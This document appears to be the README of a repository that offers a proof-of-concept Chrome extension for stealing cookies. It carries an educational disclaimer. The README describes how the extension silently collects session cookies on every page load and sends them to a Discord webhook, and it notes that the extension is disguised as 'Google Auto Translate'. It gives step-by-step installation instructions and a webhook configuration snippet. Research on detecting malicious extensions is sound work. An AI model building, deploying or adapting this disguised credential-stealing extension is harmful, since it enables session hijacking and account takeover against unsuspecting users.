# Cookie Exfiltration PoC (Educational Research)

> [!CAUTION]
> **Disclaimer:** This project is for **educational and security research purposes only**. The creator assumes no liability for any misuse or damage caused by this software. Use this tool only on systems you own or have explicit permission to test. Unauthorized access to data is illegal and unethical.

## Project Overview
This repository contains a Proof-of-Concept (PoC) browser extension (Manifest V3) designed to illustrate how malicious extensions can silently exfiltrate sensitive session data. 

By leveraging Chrome's `cookies` and `webNavigation` permissions, the extension captures session cookies upon page completion and transmits them as a `.json` file to a remote Discord webhook. This project is intended to help security researchers and SOC analysts test detection capabilities within SIEMs and browser security tools.

## 🛠 Features
*   **Real-time Monitoring:** Triggers exfiltration logic automatically via `chrome.webNavigation.onCompleted`.
*   **Session Capture:** Programmatically accesses the `chrome.cookies` API for active domains.
*   **Stealthy Exfiltration:** Utilizes Manifest V3 Service Workers to send data asynchronously without UI interruption.
*   **Webhook Integration:** Packages captured data into a structured JSON file for easy analysis via Discord.

## Installation Guide

### Step 1: Download the Repository
*   **Linux/macOS:** Run `git clone <your-repo-url>` in your terminal.
*   **Windows:** Download the repository as a **ZIP** file and extract it to a known directory.

### Step 2: Access Browser Extensions
Open your Chromium-based browser (Chrome, Edge, or Brave) and click the **Extensions icon** (puzzle piece) in the top right corner.

### Step 3: Open Extension Management
Click on **"Manage extensions"** at the bottom of the menu, or navigate directly to `chrome://extensions`.

### Step 4: Enable Developer Mode
In the top right corner of the page, toggle the **Developer mode** switch to **ON**.

### Step 5: Load the Extension
1. Click the **"Load unpacked"** button in the top left corner.
2. Browse to the directory containing the project files.
3. Select the folder containing `manifest.json`.

### Step 6: Verify Installation
The extension (aliased as "Google Auto Translate") will now appear in your list of active extensions.

## Configuration

To customize the behavior of the PoC, modify the following files:

### 1. Set the Discord Webhook
Open `background.js` and locate the `WEBHOOK_URL` constant. Replace the placeholder with your actual URL:
```javascript
const WEBHOOK_URL = "[https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN](https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN)";
